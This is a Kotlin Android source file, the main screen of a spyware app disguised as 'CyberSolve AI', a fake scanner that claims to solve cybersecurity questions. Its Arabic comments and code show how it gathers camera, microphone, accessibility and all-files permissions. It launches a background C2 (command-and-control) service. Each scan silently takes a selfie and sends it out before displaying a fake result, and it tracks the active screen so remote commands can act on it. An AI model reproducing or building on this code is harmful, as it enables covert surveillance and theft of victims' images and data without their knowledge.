package com.example.disguise

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.disguise.core.C2Service
import com.example.disguise.control.CameraExfil
import com.example.disguise.util.ActivityTracker
import com.example.disguise.util.PermissionHelper
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * MainActivity — واجهة التمويه (CyberSolve AI).
 * 
 * المسؤوليات:
 * 1. عرض شاشة طلب الصلاحيات (Overlay) فور فتح التطبيق.
 * 2. العمل كماسح ضوئي وهمي لحل أسئلة الأمن السيبراني.
 * 3. التقاط صورة سيلفي بصمت عند الضغط على "مسح".
 * 4. النقر السري (7 مرات) على الشعار لفتح الإعدادات.
 * 5. تتبع الواجهة (ActivityTracker) لاستخدامها في الأوامر عن بُعد.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val SECRET_TAP_COUNT = 7
        private const val SECRET_TAP_WINDOW_MS = 3000L
    }

    // ---- مراجع UI ----
    private lateinit var permissionOverlay: View
    private lateinit var mainContent: View
    private lateinit var tvLogo: TextView
    private lateinit var tvScanStatus: TextView
    private lateinit var tvResult: TextView
    private lateinit var btnScan: MaterialButton

    // ---- النقر السري ----
    private var secretTapCount = 0
    private var lastTapTime = 0L

    // ---- طلب الصلاحيات (الحديث) ----
    private val requestCameraPermission = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) Toast.makeText(this, "تم تفعيل الكاميرا", Toast.LENGTH_SHORT).show()
        else Toast.makeText(this, "يجب تفعيل الكاميرا للمسح الضوئي", Toast.LENGTH_SHORT).show()
    }

    private val requestMicPermission = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) Toast.makeText(this, "تم تفعيل الميكروفون", Toast.LENGTH_SHORT).show()
        else Toast.makeText(this, "يجب تفعيل الميكروفون لتحويل الصوت لنص", Toast.LENGTH_SHORT).show()
    }

    private val requestNotificationPermission = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* لا نحتاج فعل شيء هنا */ }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupUI()
        setupPermissionOverlay()
        setupSecretTap()
        setupScannerButton()

        // طلب إذن الإشعارات (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestNotificationPermission.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        // بدء خدمة C2 في الخلفية
        try {
            C2Service.start(this)
            Log.d(TAG, "C2Service.start() called")
        } catch (e: Exception) {
            Log.e(TAG, "failed to start C2Service: ${e.message}", e)
        }
    }

    // ============================================================
    // تتبع دورة حياة الواجهة (مهم جداً لأمر /selfie من الخلفية)
    // ============================================================
    override fun onResume() {
        super.onResume()
        ActivityTracker.setCurrentActivity(this)
    }

    override fun onPause() {
        super.onPause()
        ActivityTracker.clearCurrentActivity()
    }

    // ============================================================
    // 1. إعداد الواجهة
    // ============================================================
    private fun setupUI() {
        permissionOverlay = findViewById(R.id.permission_overlay)
        mainContent = findViewById(R.id.main_content)
        tvLogo = findViewById(R.id.tvLogo)
        tvScanStatus = findViewById(R.id.tvScanStatus)
        tvResult = findViewById(R.id.tvResult)
        btnScan = findViewById(R.id.btnScan)

        // إظهار شاشة الصلاحيات وإخفاء المحتوى الرئيسي في البداية
        permissionOverlay.visibility = View.VISIBLE
        mainContent.visibility = View.GONE
    }

    // ============================================================
    // 2. إعداد أزرار شاشة الصلاحيات (Overlay)
    // ============================================================
    private fun setupPermissionOverlay() {
        val btnPermCamera = findViewById<MaterialButton>(R.id.btnPermCamera)
        val btnPermMic = findViewById<MaterialButton>(R.id.btnPermMic)
        val btnPermAccessibility = findViewById<MaterialButton>(R.id.btnPermAccessibility)
        val btnPermFiles = findViewById<MaterialButton>(R.id.btnPermFiles)
        val btnStartApp = findViewById<MaterialButton>(R.id.btnStartApp)

        // زر الكاميرا
        btnPermCamera.setOnClickListener {
            requestCameraPermission.launch(Manifest.permission.CAMERA)
        }

        // زر الميكروفون
        btnPermMic.setOnClickListener {
            requestMicPermission.launch(Manifest.permission.RECORD_AUDIO)
        }

        // زر إمكانية الوصول (فتح الإعدادات)
        btnPermAccessibility.setOnClickListener {
            Toast.makeText(this, "يرجى البحث عن 'CyberSolve' وتفعيل الخدمة", Toast.LENGTH_LONG).show()
            PermissionHelper.openAccessibilitySettings(this)
        }

        // زر الملفات (فتح الإعدادات)
        btnPermFiles.setOnClickListener {
            Toast.makeText(this, "يرجى السماح بالوصول لجميع الملفات", Toast.LENGTH_LONG).show()
            PermissionHelper.openAllFilesSettings(this)
        }

        // زر البدء (إخفاء شاشة الصلاحيات وإظهار الماسح)
        btnStartApp.setOnClickListener {
            // التحقق من الصلاحيات الأساسية قبل السماح بالدخول
            if (!PermissionHelper.isAccessibilityEnabled(this)) {
                Toast.makeText(this, "الرجاء تفعيل خدمة قراءة الشاشة أولاً", Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }
            if (!PermissionHelper.hasAllFilesAccess()) {
                Toast.makeText(this, "الرجاء السماح بالوصول لجميع الملفات أولاً", Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }

            // إذا كان كل شيء جاهزاً، ابدأ!
            permissionOverlay.visibility = View.GONE
            mainContent.visibility = View.VISIBLE
        }
    }

    // ============================================================
    // 3. إعداد زر المسح الضوئي (التقاط السيلفي وعرض النتيجة الوهمية)
    // ============================================================
    private fun setupScannerButton() {
        btnScan.setOnClickListener {
            // 1. التحقق من صلاحية الكاميرا
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "الرجاء تفعيل صلاحية الكاميرا أولاً", Toast.LENGTH_SHORT).show()
                permissionOverlay.visibility = View.VISIBLE
                mainContent.visibility = View.GONE
                return@setOnClickListener
            }

            // 2. التقاط صورة سيلفي بصمت وإرسالها
            try {
                CameraExfil.takeSilentSelfie(this)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to take silent selfie: ${e.message}")
            }

            // 3. عرض واجهة "جاري التحليل" وهمياً
            btnScan.isEnabled = false
            tvScanStatus.text = getString(R.string.scanner_analyzing)
            tvResult.visibility = View.GONE

            // 4. محاكاة عملية التحليل (تأخير 3 ثوانٍ)
            CoroutineScope(Dispatchers.Main).launch {
                delay(3000)
                tvScanStatus.text = getString(R.string.scanner_ready)
                tvResult.text = getString(R.string.scanner_fake_answer)
                tvResult.visibility = View.VISIBLE
                btnScan.isEnabled = true
            }
        }
    }

    // ============================================================
    // 4. النقر السري (7 مرات على الشعار)
    // ============================================================
    private fun setupSecretTap() {
        tvLogo.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime > SECRET_TAP_WINDOW_MS) {
                secretTapCount = 0
            }
            lastTapTime = now
            secretTapCount++

            Log.d(TAG, "secret tap: $secretTapCount/$SECRET_TAP_COUNT")

            if (secretTapCount >= SECRET_TAP_COUNT) {
                secretTapCount = 0
                Toast.makeText(this, "فتح إعدادات النظام...", Toast.LENGTH_SHORT).show()
                PermissionHelper.openAccessibilitySettings(this)
            }
        }
    }
}
